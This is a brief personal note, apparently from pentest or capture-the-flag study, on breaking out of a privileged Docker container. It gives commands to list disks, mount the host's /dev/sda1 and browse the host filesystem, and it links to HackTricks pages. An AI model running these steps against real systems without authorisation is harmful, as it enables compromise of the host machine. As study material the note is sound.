# Docker Breakout

## Mounting a disk

If you’re root user in a docker container, try running 

```bash
fdisk -l
```

You might find that you can mount

![Untitled](Docker%20Breakout%209f090348725b41f0a9ba704f60cb6949/Untitled.png)

If you’re able to mount the Linux OS like I can with `/dev/sda1`,  try this.

```bash
mkdir /mnt/own
mount /dev/sda1 /mnt/own
cd /mnt/own
```

The expected output is shown

![Untitled](Docker%20Breakout%209f090348725b41f0a9ba704f60cb6949/Untitled%201.png)

You’re now in the files of the system.

![Untitled](Docker%20Breakout%209f090348725b41f0a9ba704f60cb6949/Untitled%202.png)

This can be found in hacktricks

[Docker Breakout / Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privileged)

**************************************************************************Note: hacktricks has at least 2 docker pages (one [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privileged) and the other [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout)) that have different information on breakout. Go to [this one](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privileged) if you’re trying to escalate your privileges.*